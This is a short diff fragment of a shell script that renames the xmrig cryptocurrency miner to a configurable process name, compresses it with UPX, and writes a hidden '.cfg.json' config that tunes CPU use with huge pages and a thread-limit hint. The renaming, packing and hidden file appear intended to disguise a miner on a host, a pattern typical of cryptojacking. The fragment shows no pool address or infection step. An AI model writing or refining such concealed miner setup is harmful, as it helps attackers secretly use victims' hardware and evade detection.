@@ -34,11 +34,17 @@ mv xmrig "$PROCESS_NAME"
 chmod +x "$PROCESS_NAME"
 upx --best --lzma "$PROCESS_NAME" >/dev/null 2>&1
 
-# ==== Tạo file cấu hình ====
+MAX_THREADS_HINT=$(awk "BEGIN { print $CPU_PERCENT / 100 }")
+
 cat > .cfg.json <<EOF
 {
   "autosave": true,
-  "cpu": true,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "yield": true,
+    "max-threads-hint": $MAX_THREADS_HINT
+  },
   "background": false,
   "pools": [
     {
